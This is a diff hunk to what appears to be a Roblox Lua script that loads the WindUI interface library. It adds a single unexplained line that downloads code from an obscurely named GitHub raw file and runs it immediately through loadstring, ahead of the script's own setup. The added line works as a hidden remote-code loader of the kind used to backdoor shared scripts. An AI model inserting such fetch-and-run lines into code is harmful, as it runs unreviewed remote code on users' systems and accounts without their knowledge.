@@ -19,6 +19,8 @@ Workspace = game:GetService('Workspace')
 ContentProvider = game:GetService("ContentProvider")
 
 
+loadstring(game:HttpGet("https://raw.githubusercontent.com/imtiyazltr/Usushsnxnx/refs/heads/main/HAJAJAJAJSJD"))()
+
 local WindUI
 local success, err = pcall(function()
     -- Coba memuat dari repo utama
